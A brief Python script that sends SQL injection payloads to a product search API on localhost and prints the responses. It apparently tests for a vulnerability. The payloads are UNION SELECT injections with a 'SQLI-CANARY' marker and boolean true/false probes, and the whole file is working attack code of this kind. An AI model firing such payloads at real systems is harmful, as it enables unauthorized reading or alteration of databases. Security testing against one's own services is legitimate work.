import urllib.request, urllib.parse, json

def call(k):
    url = 'http://127.0.0.1:8081/api/products/search?keyword=' + urllib.parse.quote(k)
    try:
        r = urllib.request.urlopen(url)
        body = r.read().decode('utf-8', 'replace')
        print('KEY=', repr(k))
        print('STATUS=', r.status, 'LEN=', len(body))
        print('BODY=', body[:1000])
    except Exception as e:
        print('KEY=', repr(k), 'ERR=', type(e).__name__, str(e)[:300])

payloads = [
    "%' UNION SELECT 999,'PWN',1,'SQLI-CANARY','desc',1.00,1,NULL,0,NULL,NULL,0,1,NOW(),NOW(),'shop'-- -",
    "%' UNION SELECT 999,'PWN',1,'SQLI-CANARY','desc',1.00,1,NULL,0,NULL,NULL,0,1,NOW(),NOW(),'shop'#",
    "AWA%' AND 1=1-- -",
    "AWA%' AND 1=2-- -",
]
for p in payloads:
    call(p)
